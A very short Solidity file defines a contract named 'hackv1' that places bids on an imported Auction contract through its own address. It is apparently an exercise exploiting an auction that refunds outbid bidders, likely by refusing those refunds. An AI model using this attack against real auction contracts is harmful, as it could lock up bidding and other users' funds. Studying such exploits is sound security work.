pragma solidity >=0.4.22 <0.6.0;

import "./Auction.sol";

contract hackv1{
    function hack_bid(address ad1) payable public{
        Auction A1 = Auction(ad1);
        A1.bid.value(msg.value)();
    }
}
